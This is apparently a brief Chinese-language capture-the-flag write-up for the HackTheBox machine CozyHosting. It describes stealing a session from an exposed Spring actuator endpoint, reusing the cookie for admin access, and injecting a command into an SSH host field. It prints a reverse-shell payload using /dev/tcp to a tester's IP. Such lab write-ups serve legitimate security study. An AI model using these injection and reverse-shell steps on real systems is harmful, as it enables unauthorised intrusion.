## CozyHosting
#eASY #Linux

nmap 扫描端口

dirsearch 扫描目录

![](attachments/Pasted%20image%2020230910150836.png)

`http://cozyhosting.htb/actuator/sessions`

![](attachments/Pasted%20image%2020230910150903.png)

配置cookie登录，访问admin

![](attachments/Pasted%20image%2020230910151303.png)

host ：127.0.0.1
username: root

![](attachments/Pasted%20image%2020230910153419.png)

这里应该是命令执行 ssh


![](attachments/Pasted%20image%2020230910153533.png)

带有username和host的是`[-J [user@]host[:port]]`

```
;`(sh)0>/dev/tcp/10.10.16.8/9999`
exec >&0
```
![](attachments/Pasted%20image%2020230910164753.png)

script /dev/null -c bash 美化

![](attachments/Pasted%20image%2020230910164957.png)

